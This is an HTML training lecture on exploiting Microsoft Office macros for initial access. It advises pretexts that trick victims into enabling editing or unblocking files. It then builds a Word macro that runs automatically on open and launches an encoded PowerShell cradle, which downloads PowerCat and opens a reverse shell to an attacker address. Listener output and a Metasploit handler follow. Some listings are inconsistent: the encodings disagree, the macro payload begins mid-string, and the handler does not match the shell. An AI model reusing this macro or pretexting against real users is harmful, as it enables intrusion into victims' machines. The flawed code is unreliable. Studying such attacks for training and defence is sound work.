<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lecture: Exploiting Microsoft Office Macros</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            line-height: 1.7;
            margin: 0;
            padding: 20px;
            background-color: #0f172a; /* slate-900 - dark background */
            color: #cbd5e1; /* slate-300 - light text */
        }
        .container {
            max-width: 900px;
            margin: auto;
            background: #1e293b; /* slate-800 - content background */
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }
        h1, h2, h3, h4 {
            color: #e2e8f0; /* slate-100 - light headings */
            font-weight: 700;
            margin-top: 20px;
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            border-bottom: 3px solid #22d3ee; /* cyan-400 */
            padding-bottom: 15px;
            color: #22d3ee; /* cyan-400 */
        }
        h2 {
            font-size: 1.8em;
            border-bottom: 2px solid #334155; /* slate-700 */
            padding-bottom: 10px;
            margin-bottom: 1.5rem;
        }
        h3 {
            font-size: 1.4em;
            color: #22d3ee; /* cyan-400 */
            margin-top: 2rem;
            margin-bottom: 1rem;
        }
        h4 {
            font-size: 1.25rem;
            color: #94a3b8; /* slate-400 */
            margin-top: 1.5rem;
            margin-bottom: 0.75rem;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: #1e293b; /* slate-800 */
        }
        table, th, td {
            border: 1px solid #334155; /* slate-700 */
        }
        th, td {
            padding: 12px;
            text-align: left;
        }
        th {
            background-color: #334155; /* slate-700 */
            color: #e2e8f0; /* slate-100 */
            font-weight: bold;
        }
        code {
            background-color: #131720; /* Slightly darker code background */
            color: #f1f5f9; /* slate-100 */
            padding: 3px 6px;
            border-radius: 4px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.95em;
        }
        pre {
            background-color: #131720; /* Dark code background */
            color: #f1f5f9; /* slate-100 */
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
            text-align: left;
            margin-bottom: 20px;
            border: 1px solid #334155;
        }
        ul, ol {
            margin-left: 20px;
            padding-left: 0;
        }
        p {
            margin-bottom: 15px;
        }
        strong {
            color: #f472b6; /* Pink for emphasis */
        }
        .note {
            background-color: #083344; /* cyan-900 with opacity */
            border-left: 4px solid #22d3ee; /* cyan-400 */
            padding: 1rem;
            border-radius: 0.5rem;
            margin-top: 1.5rem;
            margin-bottom: 1.5rem;
        }
        .note strong {
            color: #22d3ee;
        }
        .scenario-box {
            background-color: #1e293b; /* slate-800 */
            border: 1px solid #334155; /* slate-700 */
            border-radius: 0.75rem;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }
        .scenario-box div {
            margin-bottom: 0.5rem;
        }
        .scenario-box span {
            font-weight: 700;
            color: #e2e8f0; /* slate-100 */
        }
        .copyright-text {
            position: fixed;
            top: 50%;
            font-size: 0.75rem; /* text-xs */
            color: #cbd5e1; /* slate-300 */
            opacity: 0.05; /* very subtle */
            white-space: nowrap;
            pointer-events: none; /* ensures text doesn't block interaction */
            z-index: 1000;
        }
        .copyright-left {
            left: 0;
            transform-origin: top left;
            transform: translateY(-50%) rotate(-90deg) translateX(-50%);
        }
        .copyright-right {
            right: 0;
            transform-origin: top right;
            transform: translateY(-50%) rotate(90deg) translateX(50%);
        }
        footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #334155; /* slate-700 */
            color: #94a3b8; /* slate-400 */
            font-size: 0.9em;
        }
        .social-icons {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            vertical-align: middle;
        }
        .social-icons img {
            height: 1.2em;
            vertical-align: middle;
        }
        a {
            color: #22d3ee;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="copyright-text copyright-left">
        Hossam Shady | Red Nexus Academy &copy; Hossam Shady | Red Nexus Academy &copy; Hossam Shady | Red Nexus Academy &copy;
    </div>

    <div class="copyright-text copyright-right">
        Hossam Shady | Red Nexus Academy &copy; Hossam Shady | Red Nexus Academy &copy; Hossam Shady | Red Nexus Academy &copy;
    </div>

    <div class="container">
        <header style="text-align: center; margin-bottom: 2rem;">
            <h1>11.2. Exploiting Microsoft Office</h1>
            <div style="background-color: #f8fafc; color: #1e293b; font-weight: bold; display: inline-flex; align-items:center; gap: 15px; text-align: center; padding: 8px 15px; margin-top: 15px; border-radius: 6px;">
                <span style="color: #1e293b;">Presented By Hossam Shady (Red Nexus Academy)</span>
                <a href="https://www.linkedin.com/in/hossam-ayman-123330193" target="_blank" class="social-icons">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn">
                </a>
                <a href="https://wa.me/+201003425890" target="_blank" class="social-icons">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" alt="WhatsApp">
                </a>
            </div>
            <p style="margin-top: 1rem; font-size: 1.1em; color: #94a3b8;">Learning Objectives: Understanding Client-Side Attacks</p>
        </header>

        <main>
            <p>This Learning Unit covers the following Learning Objectives:</p>
            <ul style="list-style-type: disc; margin-left: 20px;">
                <li>Understand variations of Microsoft Office client-side attacks</li>
                <li>Install Microsoft Office</li>
                <li>Leverage Microsoft Word Macros</li>
            </ul>
            <p>Ransomware attacks have increased dramatically in recent years.<sup>1</sup> In most cases, the initial breach involved a malicious Microsoft Office macro. This is a common attack vector since Office is ubiquitous and Office documents are commonly emailed between colleagues.</p>
            <p>In this Learning Unit, we'll first discuss various considerations of malicious Office documents in a client-side attack scenario. Next, we'll walk through the Office installation process and finally, we'll create a malicious Word document with embedded macros to obtain a reverse shell.</p>
            <p><sup>1</sup> (Comparitech, 2022), https://www.comparitech.com/antivirus/ransomware-statistics/ ↩︎</p>

            <h2>11.2.1. Preparing the Attack</h2>
            <p>Before we jump into the more hands-on elements of this Learning Unit, let's discuss three important considerations when we use malicious Office documents in a client-side attack.</p>
            <p>First, we must consider the delivery method of our document. Since malicious macro attacks are well-known, email providers and spam filter solutions often filter out all Microsoft Office documents by default. Therefore, in a majority of situations we can't just send the malicious document as an attachment. Furthermore, most anti-phishing training programs stress the danger of enabling macros in an emailed Office document.</p>
            <p>To deliver our payload and increase the chances that the target opens the document, we could use a pretext and provide the document in another way, like a download link. Attackers often craft a sophisticated pretext to convince the user that the document is critical, such as an urgent invoice, a new company policy, or a report from a senior manager.</p>
            <p>If we successfully manage to deliver the Office document to our target via email or download link, the file will be tagged with the <strong>Mark of the Web</strong> (MOTW).<sup>1</sup> Office documents tagged with MOTW will open in <strong>Protected View</strong>,<sup>2</sup> which disables all editing and modification settings in the document and blocks the execution of macros or embedded objects. When the victim opens the MOTW-tagged document, Office will show a warning with the option to <strong>Enable Editing</strong>.</p>
            <p style="text-align: center;"><img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/Screenshot%202025-08-11%20065922.png" alt="Figure 12: Protected View in action"></p>
            <p>When the victim enables editing, the protected view is disabled. Therefore, the most basic way to overcome this limitation is to convince the target to click the <strong>Enable Editing</strong> button by, for example, blurring the rest of the document and instructing them to click the button to "unlock" it.</p>
            <p>We could also rely on other macro-enabled Microsoft Office programs that lack Protected View, like Microsoft Publisher, but this is less frequently installed.</p>
            <p>Finally, we must consider Microsoft's announcement that discusses blocking macros by default.<sup>3</sup> This change affects Access, Excel, PowerPoint, Visio, and Word. Microsoft implemented this in a majority of Office versions such as Office 2021 all the way back to Office 2013. The implementation dates for the various channels are listed in the corresponding Microsoft Learn page.<sup>4</sup></p>
            <p>The announcement states that macros in files delivered via the Internet may no longer be activated by the click of a button, but by following a more tedious process. For example, when a user opens a document with embedded macros, they will no longer receive the <strong>Enable Content</strong> message:</p>
            <p style="text-align: center;"><img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/Screenshot%202025-08-11%20065704.png" alt="Figure 13: Possibility to execute Macros by clicking one Button"></p>
            <p>Instead, they will receive a new, more ominous message with a <strong>Learn More</strong> button:</p>
            <p style="text-align: center;"><img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/Screenshot%202025-08-11%20065755.png" alt="Figure 14: Changed message after opening the document"></p>
            <p>If users click on <strong>Learn More</strong>, the resulting Microsoft web page<sup>5</sup> will outline the dangers of enabling macros.</p>
            <p>Additionally, Microsoft provides instructions on how to unblock the macro by checking <strong>Unblock</strong> under file properties.</p>
            <p>This means that after this change, we must convince the user to unblock the file via the checkbox before our malicious macro can be executed.</p>
            <p>This section provided an overview of important considerations for attacks leveraging Microsoft Office. Additionally, we discussed a Microsoft announcement outlining a change in how macros in files delivered over the Internet may be opened. This may further complicate vectors involving malicious Office documents. However, if we enumerate our target thoroughly and consider the information from this section, we can tremendously increase our probability of success.</p>
            <p>Before we head into the next section, let's zoom out here for a moment. Even after adding all these mitigations and creating general awareness, malicious Microsoft Office macros are still one of the most commonly used client-side attacks. This example reveals an underlying dynamic between defenders and attackers. For every implemented security technology or component, attackers are forced to come up with novel attack vectors and bypasses. This leads to a spiral, in which both sides need to consistently come up with more sophisticated approaches over time to be successful. We as penetration testers should therefore never be discouraged by new defensive mechanisms, but treat them as opportunities to create more sophisticated attacks.</p>
            <p><sup>1</sup> (MITRE ATT&CK, 2022), https://attack.mitre.org/techniques/T1553/005/ ↩︎<br>
            <sup>2</sup> (Microsoft, 2019), https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653 ↩︎<br>
            <sup>3</sup> (Microsoft Techcommunity, 2022), https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805 ↩︎<br>
            <sup>4</sup> (Microsoft Learn, 2023), https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked ↩︎<br>
            <sup>5</sup> (Microsoft Support, 2022), https://support.microsoft.com/en-us/topic/a-potentially-dangerous-macro-has-been-blocked-0952faa0-37e7-4316-b61d-5b5ed6024216 ↩︎</p>

            <h2>11.2.2. Installing Microsoft Office</h2>
            <p>In this section we'll install Microsoft Office on the OFFICE machine (VM #1). We'll use RDP to connect to the system with a username of offsec and a password of lab.</p>
            <p>On Windows 11, <strong>Network Level Authentication</strong> (NLA)<sup>1</sup> is enabled by default for RDP connections. Because OFFICE is not a domain-joined machine, <code>rdesktop</code> won't connect to it. We can use <code>xfreerdp</code> instead, which supports NLA for non domain-joined machines.</p>
            <p>Once connected, we'll navigate to <code>C:\tools\Office2019.img</code> via Windows Explorer and double-click the file. A popup window asks if we want to open this file, and we'll respond by clicking Open. This will load the file as a virtual CD and allow us to start the installation process by clicking on <code>Setup.exe</code>.</p>
            <p style="text-align: center;"><img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/Screenshot%202025-08-11%20070551.png" alt="Figure 15: Microsoft Office 2019 installer"></p>
            <p>Once the installation is complete, we'll click on Close on the splash screen to exit the installer and open Microsoft Word from the start menu. Once Microsoft Word opens, a popup will appear. We can close it by clicking the highlighted x in the upper-right corner to start the 7-day trial.</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070643.png?raw=true" alt="Figure 16: Product Key popup"></p>
            <p>Next, a license agreement popup will appear and we must accept it by clicking Accept:</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070656.png?raw=true" alt="Figure 17: License Agreement"></p>
            <p>Next, a privacy popup is displayed. We'll click Next on the splash screen. In the next window, we'll then select No, don't send optional data and click on Accept.</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070707.png?raw=true" alt="Figure 18: Privacy Settings"></p>
            <p>Finally, we will click Done on the final window, completing the installation.</p>
            <p>With Microsoft Word installed and configured, we can explore various ways to leverage it for client-side code execution.</p>
            <p><sup>1</sup> (Wikipedia, 2021), https://en.wikipedia.org/wiki/Network_Level_Authentication ↩︎</p>

            <h2>11.2.3. Leveraging Microsoft Word Macros</h2>
            <p>Microsoft Office applications like Word and Excel allow users to embed <strong>macros</strong>,<sup>1</sup> which are a series of commands and instructions grouped together to programmatically accomplish a task. Organizations often use macros to manage dynamic content and link documents with external content.</p>
            <p>Macros can be written from scratch in <strong>Visual Basic for Applications</strong> (VBA),<sup>2</sup> which is a powerful scripting language with full access to <strong>ActiveX objects</strong><sup>3</sup> and the Windows Script Host, similar to JavaScript in HTML Applications.</p>
            <p>In this section, we'll use an embedded macro in Microsoft Word to launch a reverse shell when the document is opened. Macros are one of the oldest and best-known client-side attack vectors. They still work well today, assuming we take the considerations from the previous sections into account and can convince the victim to enable them.</p>
            <p>Bear in mind that older client-side attack vectors, including <strong>Dynamic Data Exchange</strong> (DDE)<sup>4</sup> and various <strong>Object Linking and Embedding</strong> (OLE)<sup>5</sup> methods do not work well today without significant target system modification.</p>
            <p>Let's dive in and create a macro in Word. We'll create a blank Word document with <code>mymacro</code> as the file name and save it in the <strong>.doc</strong> format. This is important because the newer <strong>.docx</strong> file type cannot save macros without attaching a containing template. This means that we can run macros within <code>.docx</code> files but we can't embed or save the macro in the document. In other words, the macro is not persistent. Alternatively, we could also use the <strong>.docm</strong> file type for our embedded macro.</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070721.png?raw=true" alt="Figure 19: Saving Document as .doc"></p>
            <p>After we save the document, we can begin creating our first macro. To get to the macro menu, we'll click on the <strong>View</strong> tab from the menu bar where we will find and click the <strong>Macros</strong> element:</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070733.png?raw=true" alt="Figure 20: Macro Menu in View Ribbon"></p>
            <p>This presents a new window in which we can manage our macros. Let's enter <code>MyMacro</code> as the name in the <strong>Macro Name</strong> section then select the <code>mymacro</code> document in the <strong>Macros in</strong> drop-down menu. This is the document that the macro will be saved to. Finally, we'll click <strong>Create</strong> to insert a simple macro framework into our document.</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070747.png?raw=true" alt="Figure 21: Create a macro for the current document"></p>
            <p>This presents the <strong>Microsoft Visual Basic for Applications</strong> window where we can develop our macro from scratch or use the inserted macro skeleton.</p>
            <p style="text-align: center;"><img src="https://github.com/hossamshady11/images/blob/main/Screenshot%202025-08-11%20070758.png?raw=true" alt="Figure 22: Macro Editor"></p>
            <p>Let's review the provided macro skeleton. The main sub procedure used in our VBA macro begins with the <strong>Sub</strong><sup>6</sup> keyword and ends with <code>End Sub</code>. This essentially marks the body of our macro.</p>
            <p>A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.</p>
            <p>At this point, our new macro, <code>MyMacro()</code>, is simply an empty sub procedure containing several lines beginning with an apostrophe, which marks the start of a single-line comment in VBA.</p>
            <pre><code>Sub MyMacro()
'
' MyMacro Macro
'
'
End Sub</code></pre>
            <p>Listing 2 - Default empty macro</p>
            <p>In this example, we'll leverage <strong>ActiveX Objects</strong>,<sup>7</sup> which provide access to underlying operating system commands. This can be achieved with <strong>WScript</strong><sup>8</sup> through the <strong>Windows Script Host Shell object</strong>.<sup>9</sup></p>
            <p>Once we instantiate a Windows Script Host Shell object with <strong>CreateObject</strong>,<sup>10</sup> we can invoke the <strong>Run</strong><sup>11</sup> method for <code>Wscript.Shell</code> in order to launch an application on the target client machine. For our first macro, we'll start a PowerShell window. The code for that macro is shown below.</p>
            <pre><code>Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub</code></pre>
            <p>Listing 3 - Macro opening powershell.exe</p>
            <p>Since Office macros are not executed automatically, we must use the predefined <strong>AutoOpen</strong> macro and <strong>Document_Open</strong> event. These procedures can call our custom procedure and run our code when a Word document is opened. They differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.</p>
            <p>Our updated VBA code is shown below:</p>
            <pre><code>Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub</code></pre>
            <p>Listing 4 - Macro automatically executing powershell.exe after opening the Document</p>
            <p>Next, we'll click on the <strong>Save</strong> icon in the <strong>Microsoft Visual Basic for Applications</strong> window and close the document. After we re-open it, we are presented with a security warning indicating that macros have been disabled. To run our macro, we'll click on <strong>Enable Content</strong>.</p>
            <p style="text-align: center;">Figure 23: Microsoft Word Macro Security Warning</p>
            <p>After we click on <strong>Enable Content</strong> a PowerShell window appears.</p>
            <p style="text-align: center;">Figure 24: Enabled Macro started a PowerShell window</p>
            <p>As Figure 24 shows, the PowerShell window was started through our macro. Very nice!</p>
            <p>In a real-world assessment, our victim must click on <strong>Enable Content</strong> to run our macros, otherwise our attack will fail. In enterprise environments, we can also face a situation where macros are disabled for Office documents in general. Fortunately for us, macros are commonly used (and allowed) in most enterprises.</p>
            <p>Let's wrap this section up by extending the code execution of our current macro to a reverse shell with the help of <strong>PowerCat</strong>.<sup>12</sup> We'll use a PowerShell download cradle and a PowerCat reverse shell command. The PowerShell command will be declared as a <strong>String</strong> in VBA.</p>
            <p>We should note that VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.</p>
            <p>To do this, we'll click on the <strong>Macros</strong> element in the <strong>View</strong> tab, select <code>MyMacro</code> in the list and click on <strong>Edit</strong> to get back to the macro editor. Next, we'll declare a string variable named <code>Str</code> with the <strong>Dim</strong><sup>14</sup> keyword, which we'll use to store our PowerShell download cradle and the command to create a reverse shell with PowerCat. The following listing shows the declaration of the variable and the modified line to run the command stored as a string in the variable.</p>
            <pre><code>Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub</code></pre>
            <p>Listing 5 - Declaring a string variable and provide it as a parameter</p>
            <p>Next, we'll employ a PowerShell command to download PowerCat and execute the reverse shell. We'll encode the command with base64 to avoid issues with special characters as we've dealt with in previous Modules. The following listing shows the PowerShell command before base64-encoding.</p>
            <p>To base64-encode our command, we can use <code>pwsh</code> on Kali as we did in the Common Web Application Attacks Module.</p>
            <pre><code>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.3 -p 4444 -e powershell</code></pre>
            <p>Listing 6 - PowerShell download cradle and PowerCat reverse shell</p>
             <div class="note">
                <strong>Note on Base64 Encoding:</strong> The command in Listing 6 is what would be encoded. When working with PowerShell and Base64, it's important to use the correct encoding. For PowerShell, the standard is UTF-16 Little Endian (UTF-16LE). This ensures that the command is correctly interpreted when it's decoded and executed.
            </div>
            <p>We can use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the <code>Str</code> variable. To do this, we store the PowerShell command in a variable named <code>str</code> and the number of characters for a chunk in <code>n</code>. We must make sure that the base64-encoded command does not contain any line breaks after we paste it into the script. A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro.</p>
            <pre><code>str = "powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViY2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0L21hc3Rlci9wb3dlcmNhdC5wczEnKTsgcG93ZXJjYXQgLWMgMTkyLjE2OC4yLjMgLXAgNDQ0NCAtZSBwb3dlcnNoZWxs"
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')</code></pre>
            <p>Listing 7 - Python script to split a base64 encoded PowerShell command string</p>
            <p>Having split the base64-encoded string into smaller chunks, we can update our macro:</p>
            <pre><code>Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB"
    Str = Str + "0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvA"
    Str = Str + "GEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHI"
    Str = Str + "AYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAb"
    Str = Str + "gB0AC4AYwBvAG0ALwBiAGUAcwBpAG0AbwByAGgAaQBuAG8ALwB"
    Str = Str + "wAG8AdwBlAHIAYwBhAHQALwBtAGEAcwB0AGUAcgAvAHAAbwB3A"
    Str = Str + "GUAcgBjAGEAdAAuAHAAcwAxACcAKQA7ACAAcABvAHcAZQByAGM"
    Str = Str + "AYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADIALgAzACAAL"
    Str = Str + "QBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQB"
    Str = Str + "sAGwA" 
    CreateObject("Wscript.Shell").Run Str
End Sub</code></pre>
            <p>Listing 8 - Macro invoking PowerShell to create a reverse shell</p>
            <p>After we modify our macro, we can save and close the document. Before re-opening it, let's start a Python3 web server in the directory where the PowerCat script is located. We'll also start a Netcat listener on port 4444.</p>
            <p>After double-clicking the document, the macro is automatically executed. Note that the macro security warning regarding the <strong>Enable Content</strong> button is not appearing again. It will only appear again if the name of the document changes.</p>
            <p>After the macro is executed, we receive a GET request for the PowerCat script in our Python3 web server and an incoming reverse shell in our Netcat listener.</p>
            <pre><code>kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...connect to [192.168.2.3] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindowsPS C:\Users/offsec/Documents></code></pre>
            <p>Listing 9 - Reverse shell from Word macro</p>
            <p>Opening the document ran the macro and sent us a reverse shell. Excellent!</p>
	    <pre><code>
 kali@kali# msfconsole
 msf6> use exploit/multi/handler
 exploit/multi/handler> set payload windows/meterpreter/reverse_tcp
 exploit/multi/handler> set LHOST 192.168.2.3
 exploit/multi/handler> set LPORT 4444
 exploit/multi/handler> set ExitOnSession false
 exploit/multi/handler> exploit

	    </code></pre>
            <p>Let's briefly summarize what we did in this section. First, we created a VBA macro in a Word document to execute a single command when the document is opened. Then, we replaced the single command with a base64-encoded PowerShell command downloading PowerCat and starting a reverse shell on the local system.</p>
            <p>Microsoft Office documents containing malicious macros are still a great client-side attack vector to obtain an initial foothold in an enterprise network. However, with the growing awareness of users to not open Office documents from emails and the rising number of security technologies in place, it becomes increasingly more difficult to get a macro delivered and executed. Therefore, we'll discuss another client-side attack in the next Learning Unit, which we can use as an alternative or even as a delivery method for malicious Office documents.</p>
        </main>

        <footer>
            <p>&copy; 2025 Red Nexus Academy. All rights reserved.</p>
            <p>For more updates and resources, follow us at:</p>
            <a href="https://linktr.ee/rednexus" target="_blank"><p><strong>Red Nexus Academy</strong></p></a>
        </footer>
    </div>
</body>
</html>
